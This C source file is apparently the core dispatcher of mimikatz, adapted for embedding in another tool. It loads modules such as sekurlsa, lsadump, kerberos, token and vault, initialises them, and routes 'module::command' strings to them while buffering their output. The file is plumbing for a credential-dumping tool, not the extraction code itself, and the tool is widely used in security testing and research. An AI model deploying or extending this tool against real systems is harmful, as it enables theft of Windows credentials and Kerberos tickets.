/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : http://creativecommons.org/licenses/by/3.0/fr/
*/
#include "mimikatz.h"
#include "mimikatz_interface.h"

static wchar_t* output = NULL;
static DWORD outputLen = 0;
static DWORD outputSize = 0;

const KUHL_M * mimikatz_modules[] = {
	//&kuhl_m_standard,
	&kuhl_m_crypto,
	&kuhl_m_sekurlsa,
	&kuhl_m_kerberos,
	&kuhl_m_privilege,
	&kuhl_m_process,
	&kuhl_m_service,
	&kuhl_m_lsadump,
	&kuhl_m_ts,
	&kuhl_m_event,
	&kuhl_m_misc,
	&kuhl_m_token,
	&kuhl_m_net,
	&kuhl_m_vault,
};

DWORD mimikatz_doLocal(wchar_t * input);

const wchar_t* mimikatz_get_output()
{
	return output;
}

void mimikatz_free_output()
{
	if (output != NULL)
	{
		free(output);
	}
	output = NULL;
	outputLen = 0;
	outputSize = 0;
}

void mimikatz_append_output(const wchar_t* newOutput)
{
	outputLen += lstrlenW(newOutput) + 1;

	dprintf(L"[MIMIKATZ] appending: %s", newOutput);
	dprintf(L"[MIMIKATZ] outputSize %u outputLen %u", outputSize, outputLen);

	if (outputSize == 0)
	{
		outputSize = outputLen << 1;
		output = (wchar_t*)malloc(outputSize * sizeof(wchar_t));
		*output = '\0';
	}

	while (outputSize < outputLen)
	{
		outputSize <<= 1;
		output = (wchar_t*)realloc(output, outputSize * sizeof(wchar_t));
	}

	lstrcatW(output, newOutput);
}


BOOL WINAPI HandlerRoutine(DWORD dwCtrlType)
{
	mimikatz_initOrClean(FALSE);
	return FALSE;
}

VOID (WINAPI * RtlGetNtVersionNumbers)(LPDWORD pMajor, LPDWORD pMinor, LPDWORD pBuild);

VOID setup_function_pointers()
{
	HMODULE ntDll = GetModuleHandleA("ntdll");

	RtlGetNtVersionNumbers = (VOID (WINAPI *)(LPDWORD pMajor, LPDWORD pMinor, LPDWORD pBuild))GetProcAddress(ntDll, "RtlGetNtVersionNumbers");
	kull_m_process_initialise();
	kull_m_string_initialise();
	kull_m_handle_initialise();
}

DWORD mimikatz_initOrClean(BOOL Init)
{
	unsigned short indexModule;
	PKUHL_M_C_FUNC_INIT function;
	long offsetToFunc;
	NTSTATUS fStatus;

	if (Init)
	{
		dprintf(L"[MIMIKATZ] initorclean - setting up function pointers");
		setup_function_pointers();
		dprintf(L"[MIMIKATZ] initorclean - set writer");
		kull_m_output_set_writer(mimikatz_append_output);

		if (RtlGetNtVersionNumbers != NULL)
		{
			dprintf(L"[MIMIKATZ] initorclean - GetNTVersion");
			RtlGetNtVersionNumbers(&MIMIKATZ_NT_MAJOR_VERSION, &MIMIKATZ_NT_MINOR_VERSION, &MIMIKATZ_NT_BUILD_NUMBER);
		}
		else
		{
			dprintf(L"[MIMIKATZ] Defaulting to Win2k");
			// default to Windows 2000
			MIMIKATZ_NT_MAJOR_VERSION = 5;
			MIMIKATZ_NT_MINOR_VERSION = 0;
			MIMIKATZ_NT_BUILD_NUMBER = 2195;
		}
		MIMIKATZ_NT_BUILD_NUMBER &= 0x00003fff;

		dprintf(L"[MIMIKATZ] initorclean - Versions: %u %u %u", MIMIKATZ_NT_MAJOR_VERSION, MIMIKATZ_NT_MINOR_VERSION, MIMIKATZ_NT_BUILD_NUMBER);

		offsetToFunc = FIELD_OFFSET(KUHL_M, pInit);
		dprintf(L"[MIMIKATZ] initorclean - init done");
	}
	else
	{
		dprintf(L"[MIMIKATZ] initorclean - tearing down up");
		offsetToFunc = FIELD_OFFSET(KUHL_M, pClean);

		kull_m_output_set_writer(NULL);
	}

	for (indexModule = 0; indexModule < sizeof(mimikatz_modules) / sizeof(KUHL_M *); indexModule++)
	{
		if (function = *(PKUHL_M_C_FUNC_INIT *)((ULONG_PTR)(mimikatz_modules[indexModule]) + offsetToFunc))
		{
			dprintf(L"[MIMIKATZ] initorclean - setting up module %s", mimikatz_modules[indexModule]->shortName);
			fStatus = function();
			if (!NT_SUCCESS(fStatus))
				kprintf(L">>> %s of \'%s\' module failed : %08x\n", (Init ? L"INIT" : L"CLEAN"), mimikatz_modules[indexModule]->shortName, fStatus);
			dprintf(L"[MIMIKATZ] initorclean - %s done", mimikatz_modules[indexModule]->shortName);
		}
	}

	if (!Init)
		kull_m_output_file(NULL);

	return (DWORD)STATUS_SUCCESS;
}

DWORD mimikatz_dispatchCommand(wchar_t * input)
{
	NTSTATUS status;

	dprintf(L"[MIMIKATZ] Dispatching command: %s", input);

	switch (input[0])
	{
		/*case L'@':
		case L'*':
		status = mimikatz_doRemote(input + 1);
		break;*/
	case L'!':
		status = kuhl_m_kernel_do(input + 1);
		break;
	default:
		status = mimikatz_doLocal(input);
	}
	return (DWORD)status;
}

DWORD mimikatz_doLocal(wchar_t * input)
{
	NTSTATUS status = STATUS_SUCCESS;
	int argc;
	wchar_t ** argv = CommandLineToArgvW(input, &argc), *module = NULL, *command = NULL, *match;
	unsigned short indexModule, indexCommand;
	BOOL moduleFound = FALSE, commandFound = FALSE;

	dprintf(L"[MIMIKATZ] doing local: %s", input);

	if (argv && (argc > 0))
	{
		if (match = wcsstr(argv[0], L"::"))
		{
			dprintf(L"[MIMIKATZ] match: %s", match);
			if (module = (wchar_t *)LocalAlloc(LPTR, (match - argv[0] + 1) * sizeof(wchar_t)))
			{
				if ((unsigned int)(match + 2 - argv[0]) < wcslen(argv[0]))
				{
					command = match + 2;
				}
				RtlCopyMemory(module, argv[0], (match - argv[0]) * sizeof(wchar_t));
				dprintf(L"[MIMIKATZ] module: %s", module);
			}
		}
		else
		{
			command = argv[0];
		}
		dprintf(L"[MIMIKATZ] command: %s", command);

		for (indexModule = 0; !moduleFound && (indexModule < sizeof(mimikatz_modules) / sizeof(KUHL_M *)); indexModule++)
		{
			moduleFound = (!module || (_wcsicmp(module, mimikatz_modules[indexModule]->shortName) == 0));
			dprintf(L"[MIMIKATZ] Checking '%s' against '%s' -> %s", module, mimikatz_modules[indexModule]->shortName, moduleFound ? L"FOUND" : L"not found");

			if (!moduleFound)
			{
				continue;
			}

			if (!command)
			{
				continue;
			}

			dprintf(L"[MIMIKATZ] Checking '%s' against %d commands for '%s'", command, mimikatz_modules[indexModule]->nbCommands, module);
			for (indexCommand = 0; !commandFound && (indexCommand < mimikatz_modules[indexModule]->nbCommands); indexCommand++)
			{
				dprintf(L"[MIMIKATZ] Checking '%s' against '%s'", command, mimikatz_modules[indexModule]->commands[indexCommand].command);
				commandFound = _wcsicmp(command, mimikatz_modules[indexModule]->commands[indexCommand].command) == 0;
				if (!commandFound)
				{
					dprintf(L"[MIMIKATZ] '%s' not found", command);
					continue;
				}

				dprintf(L"[MIMIKATZ] '%s' FOUND. Executing", command);
				status = mimikatz_modules[indexModule]->commands[indexCommand].pCommand(argc - 1, argv + 1);
			}
		}

		if (!moduleFound)
		{
			dprintf(L"[MIMIKATZ] \"%s\" module not found !", module);
			for (indexModule = 0; indexModule < sizeof(mimikatz_modules) / sizeof(KUHL_M *); indexModule++)
			{
				kprintf(L"\n%16s", mimikatz_modules[indexModule]->shortName);
				if (mimikatz_modules[indexModule]->fullName)
				{
					kprintf(L"  -  %s", mimikatz_modules[indexModule]->fullName);
				}
				if (mimikatz_modules[indexModule]->description)
				{
					kprintf(L"  [%s]", mimikatz_modules[indexModule]->description);
				}
			}
			kprintf(L"\n");
		}
		else if (!commandFound)
		{
			indexModule -= 1;
			dprintf(L"[MIMKATZ] \"%s\" command of \"%s\" module not found !", command, mimikatz_modules[indexModule]->shortName);

			kprintf(L"\nModule :\t%s", mimikatz_modules[indexModule]->shortName);
			if (mimikatz_modules[indexModule]->fullName)
			{
				kprintf(L"\nFull name :\t%s", mimikatz_modules[indexModule]->fullName);
			}
			if (mimikatz_modules[indexModule]->description)
			{
				kprintf(L"\nDescription :\t%s", mimikatz_modules[indexModule]->description);
			}
			kprintf(L"\n");

			for (indexCommand = 0; indexCommand < mimikatz_modules[indexModule]->nbCommands; indexCommand++)
			{
				kprintf(L"\n%16s", mimikatz_modules[indexModule]->commands[indexCommand].command);
				if (mimikatz_modules[indexModule]->commands[indexCommand].description)
				{
					kprintf(L"  -  %s", mimikatz_modules[indexModule]->commands[indexCommand].description);
				}
			}
			kprintf(L"\n");
		}

		LocalFree(module);
		LocalFree(argv);
	}
	return (DWORD)status;
}